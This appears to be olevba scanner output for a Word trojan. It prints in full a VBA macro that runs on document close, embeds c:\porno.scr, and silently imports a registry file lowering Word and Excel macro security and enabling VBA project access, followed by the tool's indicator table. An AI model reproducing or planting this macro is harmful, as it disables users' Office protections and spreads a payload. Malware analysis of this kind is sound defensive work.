olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.SecDown-e64f839d9029c2c49b677f47795f7e6909b09181
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Trojan.MSWord.SecDown-e64f839d9029c2c49b677f47795f7e6909b09181 
in file: Trojan.MSWord.SecDown-e64f839d9029c2c49b677f47795f7e6909b09181 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sub document_close()
On Error Resume Next
ActiveDocument.Shapes.AddOLEObject _
    FileName:="c:\porno.scr", _
    LinkToFile:=False
ActiveDocument.Save
Open "c:\vv.reg" For Output As 2
Print #2, "REGEDIT4"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #2, """Level""=dword:00000001"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
Print #2, """Level""=dword:00000001"
Print #2, """AccessVBOM""=dword:00000001"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #2, """Level""=dword:00000001"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Excel\Security]"
Print #2, """Level""=dword:00000001"
Print #2, """AccessVBOM""=dword:00000001"
Close 2
Shell "regedit /s c:\vv.reg", vbHide
Kill "c:\vv.reg"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |porno.scr           |Executable file name                         |
|IOC       |vv.reg              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

